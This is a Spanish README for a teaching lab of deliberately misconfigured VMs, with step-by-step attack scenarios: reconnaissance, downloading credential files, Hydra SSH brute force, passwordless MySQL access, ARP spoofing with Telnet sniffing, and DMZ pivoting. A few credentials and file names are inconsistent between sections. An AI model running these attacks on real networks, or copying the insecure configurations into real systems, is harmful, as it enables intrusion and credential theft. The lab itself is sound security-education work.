# Bloque 4 — Insecure Network Lab

Infraestructura de red intencionalmente insegura para demostrar ataques reales
sobre configuraciones incorrectas comunes en entornos corporativos. Debe usarse exclusivamente 
en este entorno aislado.

---

## Índice

1. [Descripción](#descripción)
2. [Topología](#topología)
3. [Máquinas virtuales](#máquinas-virtuales)
4. [Malas prácticas documentadas](#malas-prácticas-documentadas)
5. [Requisitos](#requisitos)
6. [Despliegue](#despliegue)
7. [Escenarios de ataque](#escenarios-de-ataque)
8. [Advertencia legal](#advertencia-legal)

---

## Descripción
Este bloque simula una red corporativa con errores de configuración reales y
frecuentes. El objetivo es poder reproducir y comprender los
ataques descritos en el capítulo 7 de la memoria, observando en un entorno
controlado las consecuencias de cada mala práctica.

El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant
sobre VirtualBox. Todas las redes son internas (`intnet`) y no tienen salida
real a internet durante las prácticas — la interfaz NAT de Vagrant solo se usa
durante el aprovisionamiento inicial.
---

## Topología

Pendiente de hacer.

## Máquinas virtuales

| VM | Box | IP | Red | RAM | Rol |
|---|---|---|---|---|---|
| `external-kali` | kalilinux/rolling | 100.70.9.10 | net-external | 1024 MB | Atacante |
| `firewall` | ubuntu/jammy64 | 100.70.9.1 / 192.168.57.1 / 192.168.58.1 | todas | 512 MB | Firewall permisivo |
| `dmz-server` | ubuntu/jammy64 | 192.168.57.10 | net-dmz | 512 MB | Web + FTP + Telnet |
| `internal-server` | ubuntu/jammy64 | 192.168.58.10 | net-interna | 512 MB | Datos + SSH débil |

---

## Malas prácticas documentadas

### Firewall (`firewall`)
- Política `ACCEPT` por defecto en `INPUT`, `OUTPUT` y `FORWARD`
- `ip_forward` habilitado sin restricción de rutas entre segmentos
- Sin inspección de estado (`conntrack`)
- Reglas explícitas que permiten tráfico externo → red interna directamente
- Sin logging de tráfico — los ataques no dejan rastro
- `rp_filter` desactivado — permite spoofing de origen

### DMZ (`dmz-server`)
- Apache con `ServerTokens Full` — expone versión exacta en cabeceras HTTP
- `phpinfo()` accesible públicamente en `/info.php`
- Panel de administración en `/admin/` sin ninguna autenticación
- Directorio `/backup/` con credenciales descargables vía HTTP
- FTP anónimo habilitado con vsftpd — acceso sin contraseña
- Telnet activo en puerto 23 — credenciales en texto claro
- Sin firewall local (`ufw` desactivado)
- Acceso directo a `internal-server` sin restricción (DMZ no aislada)

### Servidor interno (`internal-server`)
- SSH con `PermitRootLogin yes` y contraseña `root:root`
- Banner SSH que revela versión del sistema operativo y software
- MySQL con usuario `root` sin contraseña y `bind-address 0.0.0.0`
- Credenciales almacenadas en texto plano en base de datos
- Samba con recurso compartido anónimo sin autenticación
- Sin firewall local — todos los puertos accesibles
- Logging de sistema desactivado

---

## Requisitos

- VirtualBox >= 7.0
- Vagrant >= 2.4
- Espacio en disco: ~15 GB (boxes + VMs)
- RAM disponible: mínimo 3 GB

Instalar en el host Ubuntu Server 24.04:

```bash
# VirtualBox
sudo apt install -y virtualbox virtualbox-ext-pack

# Vagrant
wget -O- https://apt.releases.hashicorp.com/gpg | \
  sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \
  https://apt.releases.hashicorp.com $(lsb_release -cs) main" | \
  sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install -y vagrant
```

---

## Despliegue

```bash
# Clonar el repositorio y entrar al bloque
cd 4-insecure-network-lab/

# Levantar todas las VMs (primera vez: descarga boxes ~4 GB)
vagrant up

# Levantar solo una VM
vagrant up external-kali

# Acceder a una VM
vagrant ssh external-kali
vagrant ssh internal-server

# Ver estado de las VMs
vagrant status

# Detener sin destruir
vagrant halt

# Destruir todo el laboratorio
vagrant destroy -f
```

El orden de aprovisionamiento recomendado es el que gestiona Vagrant
automáticamente: `firewall` → `internal-server` → `dmz-server` → `external-kali`.

---

## Escenarios de ataque

Todos los ataques se ejecutan desde `external-kali`. Para acceder:

```bash
vagrant ssh external-kali
```

---

### 1. Reconocimiento de red

El primer paso de cualquier ataque es identificar qué máquinas existen y qué
servicios exponen. Como el firewall no filtra sondas de reconocimiento, nmap
obtiene información completa de versiones y puertos.

```bash
# Escaneo rápido de servicios en la DMZ
nmap 192.168.57.10

# Escaneo completo del servidor interno
nmap -sV -sC -O -p- -T4 192.168.58.10

# Enumeración SMB del servidor interno:
# revela shares, usuarios, política de contraseñas y workgroup
# sin necesidad de credenciales
enum4linux 192.168.58.10
```

**Qué demuestra:** sin reglas que limiten ICMP ni sondas TCP, un atacante
externo obtiene en segundos el mapa completo de la infraestructura interna,
incluyendo versiones exactas de software que pueden tener CVEs conocidos.

Para descubrimiento ARP en la red DMZ (requiere estar en el mismo segmento,
útil tras pivotar desde dmz-server):

```bash
# Desde dmz-server tras acceder por Telnet o SSH
netdiscover -i enp0s8 -r 192.168.57.0/24
netdiscover -i enp0s8 -r 192.168.58.0/24
```

---

### 2. Acceso a la DMZ

#### 2.1 Exfiltración de información vía HTTP

El servidor Apache tiene directory listing habilitado y expone directorios con
ficheros sensibles descargables sin autenticación.

```bash
# Descargar credenciales corporativas expuestas en /backup/
curl http://192.168.57.10/backup/credentials.txt

# Ver información completa del servidor PHP (versión, módulos,
# variables de entorno, rutas del sistema)
curl http://192.168.57.10/info.php
```

**Qué demuestra:** `ServerTokens Full` + directory listing permite a un
atacante obtener credenciales reales y el mapa de red interna sin explotar
ninguna vulnerabilidad, solo navegando por la web.

#### 2.2 FTP anónimo

vsftpd está configurado con `anonymous_enable=YES` y `no_anon_password=YES`,
lo que permite acceder y descargar ficheros sin ninguna credencial.

```bash
ftp 192.168.57.10
# Cuando pregunte usuario: ftpoperator
# Cuando pregunte contraseña: ftoperator
#tal como se configuró.

ftp> cd public
ftp> get passwords.txt
ftp> exit
```

**Qué demuestra:** el fichero `config_backup.txt` contiene credenciales de
base de datos en texto plano, incluyendo la IP y usuario de MySQL del servidor
interno. Un atacante obtiene acceso a la red interna sin haber comprometido
ningún sistema todavía.

#### 2.3 Telnet — credenciales en texto claro

Telnet transmite todo sin cifrar. Las credenciales son visibles en la red en
el momento del login.

```bash
telnet 192.168.57.10
# Login: ftpoperator
# Password: ftpoperator
```

**Qué demuestra:** cualquier atacante posicionado como MITM en el segmento
(ver escenario 4) captura usuario y contraseña en texto plano. SSH cifra esta
misma información — Telnet no.

---

### 3. Acceso a la red interna

#### 3.1 Fuerza bruta SSH

El servidor interno tiene SSH con `PermitRootLogin yes`, `PasswordAuthentication yes`
y sin límite de intentos efectivo. Hydra automatiza la fuerza bruta.

```bash
# Desde external-kali directamente — el firewall no bloquea
# tráfico externo hacia la red interna (mala práctica grave)
hydra -l root -p root ssh://192.168.58.10
```
```bash
# Se puede entrar a interal-server con:
 ssh root@192.168.58.10
 #user: root, password: root tal y como pone en la respuesta de hydra.
```
**Qué demuestra:** la combinación de credenciales débiles + SSH expuesto sin
protección + firewall permisivo permite acceso root completo al servidor
interno en menos de un segundo. En el Bloque 3, fail2ban bloquearía la IP
tras el primer intento fallido.

#### 3.2 Acceso MySQL sin contraseña

MySQL está configurado con `bind-address = 0.0.0.0` y el usuario root sin
contraseña, aceptando conexiones desde cualquier IP.

**Acceso directo desde external-kali:**

```bash
# El firewall permite tráfico externo → interno en el puerto 3306
# directamente, sin necesidad de pivotar
mysql -h 192.168.58.10 -u root --ssl=1 --ssl-verify-server-cert=OFF

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
mysql> SELECT * FROM network_inventory;
mysql> exit
```

**Acceso por pivoting desde dmz-server** (escenario más realista — primero
comprometer la DMZ, luego moverse a la red interna):

```bash
# Paso 1: acceder a dmz-server por Telnet o SSH desde Kali
telnet 192.168.57.10          # usuario: ftpoperator / ftpoperator
# o bien:
ssh ftpoperator@192.168.57.10 # mismas credenciales

# Paso 2: desde dmz-server, conectar a MySQL en la red interna
# dmz-server tiene acceso directo a net-interna porque la DMZ
# no está aislada — el firewall permite DMZ → interna sin filtro
mysql -h 192.168.58.10 -u root

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
```

**Qué demuestra:** dos vectores distintos llegan al mismo resultado. El acceso
directo desde el exterior demuestra que el firewall no segmenta realmente las
redes. El pivoting demuestra que comprometer un servidor de DMZ equivale a
comprometer la red interna completa.

#### 3.3 Recurso Samba anónimo

El share `confidential` tiene `guest ok = yes`, accesible sin credenciales.

**Desde external-kali:**

```bash
smbclient //192.168.58.10/confidential -N
smb: \> ls
smb: \> get passwords.txt
smb: \> exit
```

**Desde dmz-server** (tras pivotar):

```bash
# Desde la sesión Telnet/SSH en dmz-server
smbclient //192.168.58.10/confidential -N
smb: \> get passwords.txt
smb: \> exit
```

**Qué demuestra:** el fichero `passwords.txt` contiene credenciales de todos
los servicios en texto plano. Un atacante que solo llegue a Samba ya tiene
acceso completo a toda la infraestructura sin necesidad de explotar nada más.

---

### 4. ARP Spoofing y captura de tráfico

El ARP Spoofing se ejecuta desde `external-kali` posicionándose entre
`dmz-server` y el `firewall` para interceptar todo su tráfico. Como no hay
DHCP snooping ni ARP inspection, el ataque es inmediato e indetectable.

```bash
# Paso 1: habilitar ip_forward en Kali para que el tráfico
# interceptado siga fluyendo y no se corte la comunicación
sudo sysctl -w net.ipv4.ip_forward=1

# Paso 2: enviar ARP replies falsos en ambas direcciones
# Kali le dice a dmz-server que la MAC del firewall es la suya
# Kali le dice al firewall que la MAC de dmz-server es la suya
sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
sudo arpspoof -i eth1 -t 192.168.57.1  192.168.57.10 &

# Paso 3: capturar el tráfico Telnet en texto claro
# Las credenciales aparecen visibles en la captura.
#Se puede ver el texto en claro mejor usando sudo tcpdump -i eth1 -A -s0 port 23 2>/dev/null | grep -E '[a-zA-Z]{3,}'
sudo tcpdump -i eth1 -A -s0 port 23
```

Mientras `tcpdump` está activo, abrir otra terminal y conectarse por Telnet
a `dmz-server` desde cualquier máquina. Las credenciales aparecerán en texto
plano en la captura.
```bash
telnet 192.168.57.10
```

```bash
# Para detener el ARP spoofing al terminar CTRL+C o:
sudo killall arpspoof
sudo sysctl -w net.ipv4.ip_forward=0
```

**Qué demuestra:** Telnet y FTP transmiten credenciales sin cifrar. En el
Bloque 3 estos protocolos están eliminados y reemplazados por SSH/SFTP. La
ausencia de ARP inspection hace el ataque trivial en cualquier red plana.

---

### 5. Pivoting DMZ → red interna

Este escenario resume la cadena de ataque completa y demuestra por qué la
DMZ debe estar aislada de la red interna.

```bash
# Paso 1: desde external-kali, acceder a dmz-server
# (usando credenciales obtenidas en el escenario 2)
ssh ftpoperator@192.168.57.10   # password: ftpoperator

# Paso 2: desde dmz-server, acceder a todos los servicios
# de la red interna directamente — el firewall no lo impide
mysql -h 192.168.58.10 -u root 
smbclient //192.168.58.10/confidential -N

# Paso 3: acceso SSH completo al servidor interno
# con credenciales obtenidas en escenarios anteriores
ssh root@192.168.58.10   # password: root
```

**Qué demuestra:** comprometer un servidor de DMZ debería ser un incidente
contenido. En este laboratorio, equivale a comprometer toda la red interna
porque no existe aislamiento real entre segmentos. En el Bloque 3, reglas
de firewall explícitas impiden cualquier conexión iniciada desde la DMZ
hacia la red interna.

---

## Advertencia legal

Este laboratorio contiene configuraciones deliberadamente inseguras.
Debe ejecutarse exclusivamente en el entorno aislado descrito. 
Todos los datos son ficticios.
